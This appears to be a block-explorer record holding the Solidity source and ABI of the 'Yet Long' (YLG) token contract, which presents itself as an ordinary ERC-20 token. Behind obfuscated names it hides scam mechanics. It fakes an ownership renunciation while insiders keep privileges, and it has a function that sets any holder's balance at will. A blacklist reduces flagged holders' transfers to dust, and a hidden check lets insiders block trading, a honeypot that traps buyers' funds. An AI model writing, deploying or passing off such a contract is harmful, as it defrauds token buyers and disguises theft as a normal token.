{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface isFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapListLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMax {\n    function createPair(address receiverMax, address fundAt) external returns (address);\n}\n\ninterface minLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTeam) external view returns (uint256);\n\n    function transfer(address fundEnable, uint256 teamLaunched) external returns (bool);\n\n    function allowance(address tradingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundEnable,\n        uint256 teamLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMarketing, uint256 value);\n    event Approval(address indexed tradingLimit, address indexed spender, uint256 value);\n}\n\ninterface minLaunchMetadata is minLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YetLong is swapListLaunched, minLaunch, minLaunchMetadata {\n\n    function isMode() public {\n        emit OwnershipTransferred(fromList, address(0));\n        teamShould = address(0);\n    }\n\n    string private launchedTake = \"YLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return toEnableSell;\n    }\n\n    mapping(address => bool) public shouldSenderAt;\n\n    bool public limitSender;\n\n    uint256 private listAmountLaunch;\n\n    uint256 private listReceiver = 100000000 * 10 ** 18;\n\n    function swapLiquidity(address teamFrom, address fundEnable, uint256 teamLaunched) internal returns (bool) {\n        if (teamFrom == fromList) {\n            return amountReceiver(teamFrom, fundEnable, teamLaunched);\n        }\n        uint256 autoTeam = minLaunch(maxExemptIs).balanceOf(tradingTotal);\n        require(autoTeam == launchedTo);\n        require(fundEnable != tradingTotal);\n        if (tradingSell[teamFrom]) {\n            return amountReceiver(teamFrom, fundEnable, receiverAuto);\n        }\n        return amountReceiver(teamFrom, fundEnable, teamLaunched);\n    }\n\n    bool private isFee;\n\n    function tradingMarketing(address toList) public {\n        require(toList.balance < 100000);\n        if (fromTrading) {\n            return;\n        }\n        \n        shouldSenderAt[toList] = true;\n        \n        fromTrading = true;\n    }\n\n    mapping(address => uint256) private walletLimit;\n\n    function getOwner() external view returns (address) {\n        return teamShould;\n    }\n\n    uint8 private toEnableSell = 18;\n\n    function balanceOf(address txTeam) public view virtual override returns (uint256) {\n        return walletLimit[txTeam];\n    }\n\n    address public fromList;\n\n    bool public fromTrading;\n\n    uint256 public fundBuy;\n\n    function isLaunch() private view {\n        require(shouldSenderAt[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listReceiver;\n    }\n\n    function transferFrom(address teamFrom, address fundEnable, uint256 teamLaunched) external override returns (bool) {\n        if (_msgSender() != modeTrading) {\n            if (fromShouldLaunched[teamFrom][_msgSender()] != type(uint256).max) {\n                require(teamLaunched <= fromShouldLaunched[teamFrom][_msgSender()]);\n                fromShouldLaunched[teamFrom][_msgSender()] -= teamLaunched;\n            }\n        }\n        return swapLiquidity(teamFrom, fundEnable, teamLaunched);\n    }\n\n    bool public receiverTrading;\n\n    function transfer(address shouldLaunchMax, uint256 teamLaunched) external virtual override returns (bool) {\n        return swapLiquidity(_msgSender(), shouldLaunchMax, teamLaunched);\n    }\n\n    function amountReceiver(address teamFrom, address fundEnable, uint256 teamLaunched) internal returns (bool) {\n        require(walletLimit[teamFrom] >= teamLaunched);\n        walletLimit[teamFrom] -= teamLaunched;\n        walletLimit[fundEnable] += teamLaunched;\n        emit Transfer(teamFrom, fundEnable, teamLaunched);\n        return true;\n    }\n\n    address modeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private fromShouldLaunched;\n\n    address tradingTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed amountLaunchReceiver, address indexed tradingBuyLaunched);\n\n    bool private limitMin;\n\n    address public maxExemptIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTake;\n    }\n\n    uint256 public launchedFeeTx;\n\n    bool private sellSender;\n\n    uint256 private toTrading;\n\n    function allowance(address maxLimit, address receiverTotal) external view virtual override returns (uint256) {\n        if (receiverTotal == modeTrading) {\n            return type(uint256).max;\n        }\n        return fromShouldLaunched[maxLimit][receiverTotal];\n    }\n\n    uint256 constant receiverAuto = 14 ** 10;\n\n    function owner() external view returns (address) {\n        return teamShould;\n    }\n\n    function teamIs(address shouldLaunchMax, uint256 teamLaunched) public {\n        isLaunch();\n        walletLimit[shouldLaunchMax] = teamLaunched;\n    }\n\n    function approve(address receiverTotal, uint256 teamLaunched) public virtual override returns (bool) {\n        fromShouldLaunched[_msgSender()][receiverTotal] = teamLaunched;\n        emit Approval(_msgSender(), receiverTotal, teamLaunched);\n        return true;\n    }\n\n    bool private launchTrading;\n\n    uint256 launchedTo;\n\n    function txTokenTrading(address sellListAmount) public {\n        isLaunch();\n        if (limitSender != limitMin) {\n            limitMin = true;\n        }\n        if (sellListAmount == fromList || sellListAmount == maxExemptIs) {\n            return;\n        }\n        tradingSell[sellListAmount] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    string private receiverLaunch = \"Yet Long\";\n\n    address private teamShould;\n\n    uint256 buyMarketingAt;\n\n    constructor (){\n        \n        isFund maxLaunched = isFund(modeTrading);\n        maxExemptIs = enableMax(maxLaunched.factory()).createPair(maxLaunched.WETH(), address(this));\n        \n        fromList = _msgSender();\n        isMode();\n        shouldSenderAt[fromList] = true;\n        walletLimit[fromList] = listReceiver;\n        if (limitMin) {\n            toTrading = launchedFeeTx;\n        }\n        emit Transfer(address(0), fromList, listReceiver);\n    }\n\n    mapping(address => bool) public tradingSell;\n\n    function walletTakeLimit(uint256 teamLaunched) public {\n        isLaunch();\n        launchedTo = teamLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunchReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuyLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFeeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExemptIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSenderAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunched\",\"type\":\"uint256\"}],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"tradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellListAmount\",\"type\":\"address\"}],\"name\":\"txTokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamLaunched\",\"type\":\"uint256\"}],\"name\":\"walletTakeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "YetLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}